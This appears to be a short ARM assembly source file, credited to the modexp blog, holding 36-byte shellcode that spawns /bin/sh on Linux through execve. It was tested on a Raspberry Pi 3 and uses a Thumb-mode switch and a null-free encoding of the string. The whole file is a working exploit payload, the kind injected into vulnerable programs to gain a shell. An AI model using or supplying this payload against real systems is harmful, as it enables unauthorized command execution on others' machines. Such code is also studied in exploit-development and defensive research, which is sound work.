/**
  execute /bin/sh
  tested with linux running on raspberry pi 3 

  http://modexp.wordpress.com/   
*/
    // 36 bytes
    
    .arch armv6
    .global _start
    .text

_start:
    .code 32
    ldr    r0, =#0x6e69622f // /bin
    ldr    r1, =#0x68732f2f // //sh

    // switch to thumb mode
    add    r2, pc, #1
    bx     r2
    
    .code 16
    // execve("/bin/sh", NULL, NULL);
    eor    r2, r2, r2     // r2 = NULL    
    push   {r0, r1, r2}   // save string + null bytes
    mov    r0, sp         // r0 = "/bin//sh", 0
    eor    r1, r1, r1     // r1 = NULL
    mov    r7, #11        // r7 = execve
    svc    1
